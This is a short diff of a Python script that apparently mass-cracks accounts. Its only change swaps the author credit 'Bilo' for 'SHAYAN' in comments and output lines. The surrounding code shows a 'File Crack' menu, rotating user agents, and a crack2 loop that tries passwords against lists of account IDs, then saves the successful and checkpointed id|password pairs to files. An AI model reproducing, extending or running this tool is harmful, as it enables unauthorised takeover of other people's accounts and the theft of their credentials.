@@ -1,5 +1,5 @@
 #!/usr/bin/python3
-#Written by Mr Bilo
+#Written by Mr SHAYAN
 import requests,bs4,json,os,sys,random,datetime,time,re
 try:
 	import rich
@@ -102,9 +102,9 @@ $$\   $$ |$$ |\$  /$$ |
 \x1b[92;1m===================================>\x1b[92;1m
 """%(h))
 		
-def menu(): #Bilo
+def menu(): #SHAYAN
 	banner()
-	print("") #Bilo
+	print("") #SHAYAN
 	print("""%s \x1b[92;1m===================================>\x1b[92;1m """%(h))
 	print("""%s \33[1;33m[1] File Crack  """%(h))
 	print("""%s \33[1;33m[0] Exit"""%(h))
@@ -201,7 +201,7 @@ def crack2(idf,pwv):
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	print('\r%s [Bilo] %s/%s  OK*%s | CP*%s => %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
+	print('\r%s [SHAYAN] %s/%s  OK*%s | CP*%s => %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
 	ua = random.choice(ugen).replace('\n','')
 	ses = requests.Session()
 	for pw in pwv:
@@ -213,7 +213,7 @@ def crack2(idf,pwv):
 					akun.append(idf+'|'+pw)
 					ceker(idf,pw)
 				else:
-					print('\r%s [Bilo-CP] %s|%s        '%(b,idf,pw))
+					print('\r%s [SHAYAN-CP] %s|%s        '%(b,idf,pw))
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					cp+=1
